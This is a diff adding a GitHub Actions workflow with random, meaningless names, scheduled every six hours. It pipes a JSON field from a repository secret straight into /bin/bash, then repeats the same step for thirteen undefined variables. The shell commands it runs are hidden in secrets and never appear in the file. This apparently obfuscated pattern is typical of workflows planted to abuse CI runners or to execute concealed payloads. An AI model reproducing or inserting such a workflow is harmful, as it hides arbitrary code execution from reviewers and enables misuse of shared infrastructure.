@@ -1,0 +1,31 @@
+name: shenjushou7610
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shenjushou7610
+        env:
+          rki1033: ${{ secrets.rki1033 }}
+        run: |
+          echo $rki1033 | jq -r .zd37865 | /bin/bash
+          echo $e93 | jq -r .blgw525 | /bin/bash
+          echo $okro9893 | jq -r .luat6 | /bin/bash
+          echo $uhv4 | jq -r .godju98 | /bin/bash
+          echo $pwnii62 | jq -r .yx55 | /bin/bash
+          echo $xyoz6 | jq -r .yze3951 | /bin/bash
+          echo $pbg7 | jq -r .rbryo1 | /bin/bash
+          echo $bpsr0852 | jq -r .toyo65 | /bin/bash
+          echo $gv10531 | jq -r .xone747 | /bin/bash
+          echo $tyd96679 | jq -r .npo3778 | /bin/bash
+          echo $gzhkg7216 | jq -r .bqg8 | /bin/bash
+          echo $nxrea3 | jq -r .tult1 | /bin/bash
+          echo $uq97273 | jq -r .nvc91 | /bin/bash
+          echo $y45528 | jq -r .ep404 | /bin/bash
+
